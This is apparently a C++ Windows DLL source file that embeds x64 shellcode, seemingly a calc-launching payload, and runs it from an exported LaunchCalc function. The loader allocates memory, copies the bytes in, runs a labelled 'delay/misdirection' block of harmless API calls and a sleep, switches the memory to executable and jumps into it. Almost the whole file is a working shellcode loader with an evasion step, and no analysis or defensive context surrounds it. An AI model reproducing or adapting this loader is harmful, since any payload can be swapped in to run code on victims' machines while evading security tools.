#include <windows.h>


unsigned char calc_shellcode[] = {
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
    0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
    0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
    0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
    0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
    0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
};

BOOL ExecuteShellcode() {
	DWORD oldProtect = 0; // Variable to store original permissions

    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE); // CHANGE THIS LINE

    if (exec_memory == NULL) {
        return FALSE;
    }

	// Changed RtlCopyMemory to memcpy
    memcpy(exec_memory, calc_shellcode, sizeof(calc_shellcode));

   // --- Start Delay/Misdirection ---

    // Misdirection: Call some common, low-impact APIs
    DWORD tickCount = GetTickCount();
    SYSTEMTIME sysTime;
    GetSystemTime(&sysTime);

    // Delay: Pause execution for a short period
    Sleep(2000); // Sleep for 2 seconds (Adjust as needed)

    // --- End Delay/Misdirection ---

    // Change memory protection to RX before execution
    if (!VirtualProtect(exec_memory, sizeof(calc_shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        // Handle VirtualProtect error (e.g., print GetLastError())
        VirtualFree(exec_memory, 0, MEM_RELEASE); // Clean up allocated memory
        return FALSE;
    }

    void (*shellcode_func)() = (void(*)())exec_memory;

    shellcode_func();

    // (Optional but Recommended) Restore original permissions before freeing
    DWORD dummyProtect; // We don't care about the 'old' protection on this call
    VirtualProtect(exec_memory, sizeof(calc_shellcode), oldProtect, &dummyProtect);

    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL LaunchCalc() {
        return ExecuteShellcode();
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}